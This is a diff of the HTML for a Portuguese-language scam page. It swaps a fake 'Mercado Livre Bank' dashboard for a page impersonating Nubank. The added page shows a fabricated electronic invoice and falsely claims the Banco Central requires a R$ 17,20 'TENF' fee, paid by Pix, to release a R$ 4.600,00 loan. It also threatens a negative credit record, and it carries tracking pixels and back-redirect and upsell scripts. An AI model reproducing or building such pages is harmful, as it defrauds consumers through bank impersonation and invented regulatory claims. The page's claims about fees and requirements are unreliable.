@@ -1,850 +1,178 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mercado Livre Bank</title>
-    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="/up4/css/all.min.css">
-    
-    <script src="/up4/js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17359210869"></script>
+    <title>Emissão de Nota Fiscal · Nubank</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/css/upsell.css">    <script src="/js/valor-aprovado.js" defer></script>
+    <script src="/up4/js/J5UQqj6sznVc.js" data-token="4c4065b7-eb92-494a-b79f-54e0c6910f82" data-click-id-param="click_id">
+</script>
+<!-- Meta Pixel Code -->
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','26918311271184563');fbq('track','PageView');
+(function(){var c=new URLSearchParams(location.search).get('fbclid');if(c)sessionStorage.setItem('_fbclid',c);})();
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=26918311271184563&ev=PageView&noscript=1"/></noscript>
+<!-- End Meta Pixel Code -->
+<style>
+body.nf{background:#f0efec}
+.nf .n-top{max-width:480px;margin:0 auto;padding:12px 16px;display:flex;align-items:center;justify-content:space-between}
+.nf .n-top img{height:28px}.nf .n-top span{font-size:11px;font-weight:700;color:#7d02b3;background:#fff;border:1px solid var(--line);padding:5px 10px;border-radius:100px}
+.nf .n-wrap{max-width:480px;margin:0 auto;padding:6px 16px 28px}
+.nf .n-intro{padding:8px 2px 2px}
+.nf .n-intro h1{font-size:20px;font-weight:800;letter-spacing:-.3px;line-height:1.25}
+.nf .n-intro p{font-size:13.5px;color:#61594f;margin-top:6px;line-height:1.5}
+/* documento NF-e */
+.nf .doc{background:#fff;border-radius:8px;box-shadow:0 18px 40px -20px rgba(34, 29, 23, .3);overflow:hidden;border:1px solid #e8e5df;position:relative;margin-top:14px}
+.nf .doc-bar{height:7px;background:repeating-linear-gradient(45deg,#7d02b3,#7d02b3 12px,#61594f 12px,#61594f 24px)}
+.nf .doc-h{padding:14px 18px 12px;border-bottom:1px dashed #e1dacb;text-align:center}
+.nf .doc-h .t{font-size:13px;font-weight:800;color:#221d17;letter-spacing:.5px}
+.nf .doc-h .s{font-size:10px;color:#83796c;margin-top:2px;font-family:ui-monospace,monospace}
+.nf .doc-stamp{position:absolute;top:52px;right:14px;transform:rotate(-12deg);border:2.5px solid #dc2626;color:#dc2626;font-size:11px;font-weight:800;padding:4px 9px;border-radius:6px;letter-spacing:.5px;opacity:.88}
+.nf .doc-sec{padding:10px 18px;border-bottom:1px dashed #f0ece2}
+.nf .doc-sec .lab{font-size:9.5px;font-weight:800;color:#c04fed;letter-spacing:.6px;text-transform:uppercase;margin-bottom:5px}
+.nf .doc-sec .r{display:flex;justify-content:space-between;padding:4px 0;font-size:12px;gap:10px}
+.nf .doc-sec .r span{color:#83796c;flex-shrink:0}.nf .doc-sec .r b{color:#221d17;font-family:ui-monospace,monospace;text-align:right}
+.nf .doc-key{font-family:ui-monospace,monospace;font-size:10px;color:#61594f;word-break:break-all;line-height:1.5;background:#fcfbf8;border-radius:6px;padding:7px 9px;margin-top:4px}
+.nf .doc-trib{padding:10px 18px}
+.nf .doc-trib .r{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f9f7f1;font-size:12.5px}
+.nf .doc-trib .r:last-child{border-bottom:0}
+.nf .doc-trib .r span{color:#61594f}.nf .doc-trib .r b{color:#221d17;font-family:ui-monospace,monospace}
+.nf .doc-trib .r.tot{padding-top:11px;margin-top:2px;border-top:1.5px solid #e1dacb}
+.nf .doc-trib .r.tot span{font-weight:800;color:#221d17}.nf .doc-trib .r.tot b{font-size:18px;color:#7d02b3}
+.nf .doc-foot{background:#fcfbf8;padding:11px 18px;border-top:1px dashed #e1dacb;font-size:10.5px;color:#83796c;line-height:1.5;text-align:center}
+/* explicação */
+.nf .card{background:#fff;border:1px solid var(--line);border-radius:16px;padding:17px;margin-top:14px;box-shadow:var(--shadow)}
+.nf .card.acc{border-left:4px solid #9903d6}
+.nf .card h2{font-size:15px;font-weight:800;display:flex;align-items:center;gap:8px;margin-bottom:8px}
+.nf .card h2 .qi{width:24px;height:24px;border-radius:7px;background:#f7ebfc;color:#9903d6;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.nf .card p{font-size:13px;color:#61594f;line-height:1.6}
+.nf .incl{list-style:none;margin-top:6px}
+.nf .incl li{display:flex;gap:11px;align-items:flex-start;padding:9px 0;border-bottom:1px solid #f9f7f1;font-size:13px;color:#221d17}
+.nf .incl li:last-child{border-bottom:0}
+.nf .incl .ck{flex-shrink:0;width:22px;height:22px;border-radius:50%;background:#f7ebfc;color:#9903d6;display:flex;align-items:center;justify-content:center;margin-top:1px}
+.nf .incl b{font-weight:700}.nf .incl small{display:block;color:#83796c;font-size:12px;margin-top:1px}
+/* passos */
+.nf .steps{display:flex;gap:8px;margin-top:14px}
+.nf .step{flex:1;background:#fff;border:1px solid var(--line);border-radius:14px;padding:13px 8px;text-align:center;box-shadow:var(--shadow);position:relative}
+.nf .step .num{width:26px;height:26px;border-radius:50%;background:#f7ebfc;color:#9903d6;font-weight:800;font-size:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 7px}
+.nf .step.on .num{background:#9903d6;color:#fff}
+.nf .step b{font-size:11.5px;display:block;color:#221d17;line-height:1.2}.nf .step small{font-size:10px;color:#83796c}
+/* faq */
+.nf details{border:1px solid var(--line);border-radius:12px;margin-top:9px;background:#fff;overflow:hidden}
+.nf summary{list-style:none;cursor:pointer;padding:13px 15px;font-size:13px;font-weight:600;color:#221d17;display:flex;justify-content:space-between;gap:10px}
+.nf summary::-webkit-details-marker{display:none}
+.nf summary .ch{color:#9903d6;transition:.25s}.nf details[open] summary .ch{transform:rotate(180deg)}
+.nf .fb{padding:0 15px 14px;font-size:12.5px;color:#83796c;line-height:1.55}
+/* aviso */
+.nf .n-note{display:flex;gap:11px;background:var(--red-wash);border:1px solid #fecaca;border-radius:13px;padding:13px 15px;margin-top:16px}
+.nf .n-note svg{flex-shrink:0;color:var(--red);margin-top:1px}.nf .n-note p{font-size:12.5px;color:#7f1d1d;line-height:1.45}.nf .n-note b{display:block;color:var(--red);margin-bottom:2px}
+/* barra fixa */
+.nf .n-cta{position:fixed;bottom:0;left:0;right:0;z-index:60;background:rgba(255,255,255,.97);backdrop-filter:blur(10px);border-top:1px solid var(--line);padding:11px 16px calc(11px + env(safe-area-inset-bottom))}
+.nf .n-cta-in{max-width:480px;margin:0 auto;display:flex;align-items:center;gap:13px}
+.nf .n-cta .pr b{font-size:18px;font-weight:900;color:#221d17}.nf .n-cta .pr small{display:block;font-size:11px;color:#83796c}
+.nf .n-btn{margin-left:auto;flex:1;max-width:230px;border:0;cursor:pointer;background:linear-gradient(135deg,#7d02b3,#9903d6);color:#fff;font-family:inherit;font-weight:800;font-size:15px;padding:15px;border-radius:13px;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 10px 22px -8px rgba(125, 2, 179, .5);animation:breathe 2.6s ease-in-out infinite}
+.nf .n-btn:active{transform:scale(.98)}
+</style>
+</head>
+<body class="t-nu nf">
+  <div class="n-top"><img src="/images/nubank-96.svg" alt="nu"><span>Documento oficial</span></div>
+  <div class="n-wrap">
 
-  gtag('config', 'AW-17359210869');
+    <div class="n-intro">
+      <h1>Emita a Nota Fiscal da sua operação</h1>
+      <p>Para liberar seu empréstimo de <b>R$ 4.600,00</b>, o Banco Central exige a emissão da Nota Fiscal Eletrônica (NF-e) que formaliza a operação. Veja abaixo o documento e entenda exatamente o que você está pagando.</p>
+    </div>
+
+    <div class="doc">
+      <div class="doc-bar"></div>
+      <div class="doc-stamp">PENDENTE</div>
+      <div class="doc-h"><div class="t">NOTA FISCAL ELETRÔNICA · NF-e</div><div class="s">Modelo 55 · Série 001 · Nº 000.004.600</div></div>
+
+      <div class="doc-sec">
+        <div class="lab">Emitente</div>
+        <div class="r"><span>Razão social</span><b>Nubank S.A.</b></div>
+        <div class="r"><span>CNPJ</span><b>33.030.944/0001-60</b></div>
+      </div>
+      <div class="doc-sec">
+        <div class="lab">Destinatário</div>
+        <div class="r"><span>Beneficiário</span><b>Titular do contrato</b></div>
+        <div class="r"><span>Natureza da operação</span><b>Crédito pessoal</b></div>
+        <div class="r"><span>Data de emissão</span><b id="dataEmissao">—</b></div>
+      </div>
+      <div class="doc-sec">
+        <div class="lab">Discriminação</div>
+        <div class="r"><span>Operação de crédito aprovada</span><b>R$ 4.600,00</b></div>
+        <div class="r"><span>Situação do crédito</span><b>Aprovado</b></div>
+        <div class="doc-key">Chave de acesso: 3526 0033 2030 3800 0110 5500 1000 0046 0019 8765 4321</div>
+      </div>
+      <div class="doc-trib">
+        <div class="lab" style="font-size:9.5px;font-weight:800;color:#c04fed;letter-spacing:.6px;text-transform:uppercase;margin-bottom:4px">Cálculo da taxa de emissão (TENF)</div>
+        <div class="r"><span>Custo de processamento e registro</span><b>R$ 14,40</b></div>
+        <div class="r"><span>Taxa SEFAZ / autenticação</span><b>R$ 2,80</b></div>
+        <div class="r tot"><span>Total da TENF a pagar</span><b>R$ 17,20</b></div>
+      </div>
+      <div class="doc-foot">Documento exigido para formalizar a operação de crédito junto ao Banco Central do Brasil. Após a emissão e autenticação da NF-e, o valor de R$ 4.600,00 é liberado na sua conta.</div>
+    </div>
+
+    <div class="card acc">
+      <h2><span class="qi"><svg width="15" height="15" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.7.3-1 .7-1 1.4v.3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="17" r="1" fill="currentColor"/></svg></span>O que é a TENF e por que pagar?</h2>
+      <p>A <b>TENF (Taxa de Emissão da Nota Fiscal)</b> cobre o custo de gerar e autenticar a NF-e da sua operação de crédito junto à SEFAZ e ao Banco Central. Sem essa nota emitida, a operação não pode ser formalizada e o valor do empréstimo fica retido — por isso o pagamento é obrigatório para concluir a liberação.</p>
+    </div>
+
+    <div class="card">
+      <h2>O que esta taxa garante</h2>
+      <ul class="incl">
+        <li><span class="ck"><svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="m5 13 4 4L19 7" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></span><div><b>Emissão da NF-e oficial</b><small>Documento fiscal válido da sua operação</small></div></li>
+        <li><span class="ck"><svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="m5 13 4 4L19 7" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></span><div><b>Formalização no Banco Central</b><small>Registro legal da concessão de crédito</small></div></li>
+        <li><span class="ck"><svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="m5 13 4 4L19 7" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></span><div><b>Liberação do crédito</b><small>R$ 4.600,00 enviados após a emissão</small></div></li>
+        <li><span class="ck"><svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="m5 13 4 4L19 7" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></span><div><b>Proteção contra fraude</b><small>Operação rastreável e em conformidade</small></div></li>
+      </ul>
+    </div>
+
+    <div class="steps">
+      <div class="step on"><div class="num">1</div><b>Pague a TENF</b><small>via Pix</small></div>
+      <div class="step"><div class="num">2</div><b>NF-e emitida</b><small>em segundos</small></div>
+      <div class="step"><div class="num">3</div><b>Crédito liberado</b><small>R$ 4.600</small></div>
+    </div>
+
+    <section class="pay" id="pagar" style="margin-top:16px">
+      <div class="pay-ribbon"></div>
+      <div style="display:flex;align-items:center;justify-content:space-between">
+        <span class="pay-pix"><svg width="16" height="16" viewBox="0 0 24 24"><path fill="#c04fed" d="m15.45 16.52-3.01-3.01c-.17-.17-.45-.17-.62 0L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.17.17.45.17.62 0l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"/><path fill="#c04fed" d="m21.11 9.85-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.56.56-1.48.56-2.04 0L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.56-.56 1.48-.56 2.04 0l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.04 3.04 0 0 0-.02-4.29"/></svg>Pagamento via Pix</span>
+        <span style="font-size:11px;color:var(--soft);font-weight:600">Confirmação na hora</span>
+      </div>
+      <div class="pay-amount">
+        <div class="cap">Valor da TENF a pagar</div>
+        <div class="big">R$ 17<span class="cents">,20</span></div>
+        <div class="conf"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="m5 13 4 4L19 7" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>Liberação do crédito imediatamente após o pagamento</div>
+      </div>
+      <button class="btn-pay" onclick="redirect('up4')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M14 3v4a1 1 0 0 0 1 1h4M9 13h6m-6 4h4M7 3h8l5 5v11a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Emitir NF-e e liberar crédito</button>
+    </section>
+
+    <div class="card" style="margin-top:14px">
+      <h2 style="margin-bottom:4px">Dúvidas frequentes</h2>
+      <details open><summary>Por que preciso emitir uma Nota Fiscal?<svg class="ch" width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="m6 9 6 6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></summary><div class="fb">Toda operação de crédito precisa de um documento fiscal que comprove e formalize a transação junto ao Banco Central. A NF-e é esse documento — sem ele, o valor não pode ser transferido legalmente.</div></details>
+      <details><summary>A taxa é reembolsada?<svg class="ch" width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="m6 9 6 6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></summary><div class="fb">A TENF cobre custos de emissão e autenticação já realizados pelo sistema. Ela é descontada apenas uma vez e não se repete nas próximas etapas.</div></details>
+      <details><summary>Quanto tempo para o crédito cair?<svg class="ch" width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="m6 9 6 6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></summary><div class="fb">O pagamento via Pix é confirmado na hora. Assim que a NF-e é emitida, a liberação do crédito acontece em poucos minutos.</div></details>
+    </div>
+
+    <div class="n-note"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 9v4m0 4h.01M10.3 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.7 3.86a2 2 0 0 0-3.4 0Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg><div><b>Atenção</b><p>Sem a emissão da Nota Fiscal o pedido é cancelado e pode gerar anotação no seu CPF junto aos órgãos de proteção ao crédito.</p></div></div>
+
+    <footer style="text-align:center;padding:22px 16px 0;color:var(--soft);font-size:11.5px;line-height:1.7">© <span id="currentYear"></span> <span style="font-weight:800;color:var(--g700)">Nubank</span> S.A. · CNPJ nº 33.030.944/0001-60<small style="display:block;margin-top:6px;color:#c04fed">Avenida Presidente Wilson, 9 — São Vicente/SP · CEP 11320-905</small></footer>
+  </div>
+
+
+<script>
+  document.getElementById('currentYear').textContent = new Date().getFullYear();
+  (function(){ var d=new Date(); document.getElementById('dataEmissao').textContent = String(d.getDate()).padStart(2,'0')+'/'+String(d.getMonth()+1).padStart(2,'0')+'/'+d.getFullYear(); })();
 </script>
 
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Sora', sans-serif;
-        }
-        
-        body {
-            background-color: #f5f5f5;
-            color: #333;
-        }
-        
-        .container {
-            max-width: 480px;
-            margin: 0 auto;
-            padding: 0 15px;
-        }
-        
-        header {
-            background-color: #820ad1;
-            padding: 15px 0;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        
-        .header-content {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .logo {
-            height: 32px;
-        }
-        
-        .user-profile {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background-color: #f3e8ff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #820ad1;
-            font-weight: 600;
-        }
-        
-        .balance-card {
-            background: linear-gradient(135deg, #820ad1, #9f3cff);
-            border-radius: 16px;
-            padding: 25px;
-            color: white;
-            margin: 20px 0;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
-        }
-        
-        .balance-title {
-            font-size: 14px;
-            font-weight: 400;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-        }
-        
-        .balance-amount {
-            font-size: 28px;
-            font-weight: 600;
-            margin-bottom: 20px;
-        }
-        
-        .card-container {
-            position: relative;
-            margin: 25px 0;
-        }
-        
-        .card-image {
-            width: 100%;
-            border-radius: 12px;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.1);
-        }
-        
-        .card-info {
-            margin-top: 15px;
-        }
-        
-        .card-limit {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-        
-        .limit-bar {
-            height: 6px;
-            background-color: rgba(255,255,255,0.2);
-            border-radius: 3px;
-            margin-top: 8px;
-            overflow: hidden;
-        }
-        
-        .limit-progress {
-            height: 100%;
-            width: 65%;
-            background-color: #fff;
-            border-radius: 3px;
-        }
-        
-        .quick-actions {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 15px;
-            margin: 30px 0;
-        }
-        
-        .action-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-        }
-        
-        .action-icon {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background-color: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
-            color: #820ad1;
-            font-size: 20px;
-        }
-        
-        .action-name {
-            font-size: 12px;
-            color: #666;
-        }
-        
-        .section-title {
-            font-size: 18px;
-            font-weight: 600;
-            margin: 25px 0 15px;
-            color: #333;
-        }
-        
-        .transactions {
-            background-color: #fff;
-            border-radius: 16px;
-            padding: 5px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-        }
-        
-        .transaction-item {
-            display: flex;
-            align-items: center;
-            padding: 15px;
-            border-bottom: 1px solid #f0f0f0;
-        }
-        
-        .transaction-item:last-child {
-            border-bottom: none;
-        }
-        
-        .transaction-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background-color: #f5f5f5;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-            color: #820ad1;
-        }
-        
-        .transaction-details {
-            flex: 1;
-        }
-        
-        .transaction-name {
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 4px;
-        }
-        
-        .transaction-date {
-            font-size: 12px;
-            color: #999;
-        }
-        
-        .transaction-amount {
-            font-weight: 600;
-            font-size: 14px;
-        }
-        
-        .positive {
-            color: #00a650;
-        }
-        
-        .negative {
-            color: #f23d3d;
-        }
-        
-        .offers-section {
-            margin: 30px 0;
-        }
-        
-        .offer-card {
-            background-color: #fff;
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 15px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-            display: flex;
-            align-items: center;
-        }
-        
-        .offer-icon {
-            width: 50px;
-            height: 50px;
-            border-radius: 10px;
-            background-color: #f3e8ff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-            color: #820ad1;
-            font-size: 24px;
-        }
-        
-        .offer-details {
-            flex: 1;
-        }
-        
-        .offer-title {
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-        
-        .offer-description {
-            font-size: 13px;
-            color: #666;
-        }
-        
-        .content-area {
-            padding-bottom: 30px;
-        }
-        .card {
-            background: linear-gradient(45deg, #1E1B24, #4B2E83);
-            border-radius: 15px;
-            padding: 20px;
-            height: 175px;
-            position: relative;
-            margin-bottom: 30px;
-        }
-        .card-top {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 100px;
-        }
-        .card-bottom {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-            position: absolute;
-            bottom: 10px;
-            left: 20px;
-            right: 20px;
-            width: calc(100% - 40px);
-        }
-        .card-name {
-            font-family: 'Sora', sans-serif;
-            font-size: 14px;
-            color: rgb(0, 0, 0);
-        }
-    </style>
-</head>
-<body>
-    <header>
-        <div class="container">
-            <div class="header-content">
-                <img src="/up4/images/logo.svg" alt="Mercado Livre Bank" class="logo">
-                <div style="display: flex; align-items: center;">
-                    <div class="support-buttons" style="display: flex; margin-right: 15px;">
-                        <button style="background: none; border: none; margin-right: 10px; cursor: pointer;">
-                            <i class="fas fa-headset" style="color: #fff; font-size: 18px;"></i>
-                        </button>
-                        <button style="background: none; border: none; margin-right: 10px; cursor: pointer;">
-                            <i class="fas fa-question-circle" style="color: #fff; font-size: 18px;"></i>
-                        </button>
-                        <button style="background: none; border: none; cursor: pointer;">
-                            <i class="fas fa-bell" style="color: #fff; font-size: 18px;"></i>
-                        </button>
-                    </div>
-                    <div class="user-profile" id="userInitials">BR</div>
-                    <script>
-                        document.addEventListener('DOMContentLoaded', function() {
-                            try {
-                                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
-                                const nome = dadosUsuario.NOME || '';
-                                
-                                if (nome) {
-                                    const nomes = nome.split(' ');
-                                    let iniciais = '';
-                                    
-                                    if (nomes.length > 0) {
-                                        // Primeira letra do primeiro nome
-                                        iniciais += nomes[0].charAt(0);
-                                        
-                                        // Primeira letra do último nome (se existir)
-                                        if (nomes.length > 1) {
-                                            iniciais += nomes[nomes.length - 1].charAt(0);
-                                        }
-                                        
-                                        document.getElementById('userInitials').textContent = iniciais.toUpperCase();
-                                    }
-                                }
-                            } catch (error) {
-                                console.error('Erro ao obter iniciais do usuário:', error);
-                                document.getElementById('userInitials').textContent = '';
-                            }
-                        });
-                    </script>
-                </div>
-            </div>
-        </div>
-    </header>
-    
-    <div class="container">
-        <div class="balance-container">
-            <div class="balance-label">
-                <i class="fas fa-wallet"></i>
-                <span>Saldo disponível</span>
-                <i class="fas fa-eye-slash balance-toggle"></i>
-            </div>
-            <div class="balance-value" style="margin-bottom: 0;">R$ 4.900,00</div>
-            <div style="display: flex; align-items: center; margin-top: 5px; margin-bottom: 0px;">
-                <i class="fas fa-chart-line" style="color: #00c42a; font-size: 12px; margin-right: 5px;"></i>
-                <span style="color: #00c42a; font-size: 13px; font-weight: 500;">Rendeu R$ 4,35 este mês</span>
-            </div>
-        </div>
-        
-        <style>
-            .balance-container {
-                background: linear-gradient(to right, #ffffff, #f8f9fa);
-                border-radius: 16px;
-                padding: 20px;
-                margin-top: 20px;
-                box-shadow: 0 4px 15px rgba(0,0,0,0.08);
-                border: 1px solid rgba(0,0,0,0.03);
-                transition: all 0.3s ease;
-            }
-            
-            .balance-container:hover {
-                transform: translateY(-2px);
-                box-shadow: 0 6px 18px rgba(0,0,0,0.1);
-            }
-            
-            .balance-label {
-                display: flex;
-                align-items: center;
-                font-size: 15px;
-                color: #555;
-                margin-bottom: 8px;
-                font-weight: 500;
-            }
-            
-            .balance-label i {
-                margin-right: 8px;
-                color: #820ad1;
-            }
-            
-            .balance-toggle {
-                margin-left: auto;
-                cursor: pointer;
-                color: #777;
-                transition: color 0.2s;
-            }
-            
-            .balance-toggle:hover {
-                color: #333;
-            }
-            
-            .balance-value {
-                font-size: 28px;
-                font-weight: 700;
-                color: #222;
-                margin: 10px 0 15px;
-            }
-            
-            .balance-actions {
-                display: flex;
-                gap: 10px;
-                margin-top: 5px;
-            }
-            
-            .balance-action-btn {
-                flex: 1;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                gap: 8px;
-                background-color: #f0f5ff;
-                border: none;
-                border-radius: 8px;
-                padding: 10px;
-                font-size: 14px;
-                color: #820ad1;
-                font-weight: 500;
-                cursor: pointer;
-                transition: all 0.2s;
-            }
-            
-            .balance-action-btn:hover {
-                background-color: #e0ebff;
-            }
-        </style>
-    </div>
-    
-    <div class="container content-area">
-        <div class="balance-card">
-            <div class="card-details-link" style="margin-top: 0; margin-bottom: 10px;">
-                <div style="display: flex; align-items: center; justify-content: space-between; color: #ffffff; padding-bottom: 10px; text-decoration: none; font-weight: 500;">
-                    <div style="display: flex; align-items: center;">
-                        <i class="fas fa-credit-card" style="margin-right: 10px;"></i>
-                        Ver detalhes do cartão
-                    </div>
-                    <i class="fas fa-chevron-right"></i>
-                </div>
-            </div>
+<script src="/js/upsells-shared.js"></script>
+<script>document.addEventListener('DOMContentLoaded',function(){initUpsell(4);});</script>
+<script src="/js/back-redirect.js?v=4"></script>
 
-            <div class="card" style="background: linear-gradient(135deg, #1E1B24, #4B2E83); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); overflow: hidden; position: relative;">
-                <!-- Efeito de brilho no cartão -->
-                <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;"></div>
-                <style>
-                    @keyframes shine {
-                        0% { left: -100%; }
-                        20% { left: 100%; }
-                        100% { left: 100%; }
-                    }
-                </style>
-                
-                <div class="card-top">
-                    <img src="/up4/images/logo.svg" alt="Logo Mercado Livre" style="width: 50px; filter: drop-shadow(0 2px 3px rgba(0,0,0,0.2));">
-                    <div style="font-size: 12px; color: rgba(255, 255, 255, 1); font-family: 'Sora', sans-serif; text-transform: uppercase; letter-spacing: 1px;">Gold</div>
-                </div>
-                
-                <div style="position: absolute; top: 50%; left: 0; transform: translateY(-50%); width: 100%;">
-                    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
-                        <div style="display: flex; align-items: center; margin-left: 20px;">
-                            <img src="/up4/images/chip.png" alt="Chip" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));">
-                        </div>
-                        <i class="fas fa-wifi fa-rotate-90" style="color: rgb(255, 255, 255, 1); font-size: 24px; margin-right: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3);"></i>
-                    </div>
-                </div>
-                
-                <div class="card-bottom">
-                    <div style="display: flex; flex-direction: column; align-items: flex-start;">
-                        <span class="card-name" id="cardName" style="text-shadow: 0 1px 2px rgba(0,0,0,0.3); letter-spacing: 1px;">
-                            <script>
-                                document.addEventListener('DOMContentLoaded', function() {
-                                    try {
-                                        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
-                                        if (dadosUsuario.NOME) {
-                                            document.getElementById('cardName').textContent = dadosUsuario.NOME;
-                                        } else {
-                                            // Se não houver nome, esconde o nome e o título
-                                            document.getElementById('cardName').style.display = 'none';
-                                            document.getElementById('cardName').nextElementSibling.style.display = 'none';
-                                        }
-                                    } catch (error) {
-                                        console.error('Erro ao carregar nome do usuário:', error);
-                                        // Em caso de erro, esconde o nome e o título
-                                        document.getElementById('cardName').style.display = 'none';
-                                        document.getElementById('cardName').nextElementSibling.style.display = 'none';
-                                    }
-                                });
-                            </script>
-                            <span id="cardNamePlaceholder">BENEDITA RAMOS</span>
-                        </span>
-                        <span style="font-size: 8px; color: rgba(255, 255, 255, 1); font-family: 'Sora', sans-serif; margin-top: 3px;">TITULAR DO CARTÃO</span>
-                    </div>
-                    <div style="display: flex; flex-direction: column; align-items: flex-end;">
-                        <img src="/up4/images/visa.png" alt="mastercard" style="width: 50px; filter: brightness(100);">
-                        <span style="font-size: 8px; color: rgba(255, 255, 255, 1); font-family: 'Sora', sans-serif; margin-top: 3px; text-transform: uppercase;">Crédito</span>
-                    </div>
-                </div>
-                
-                <!-- Padrão de segurança no fundo do cartão -->
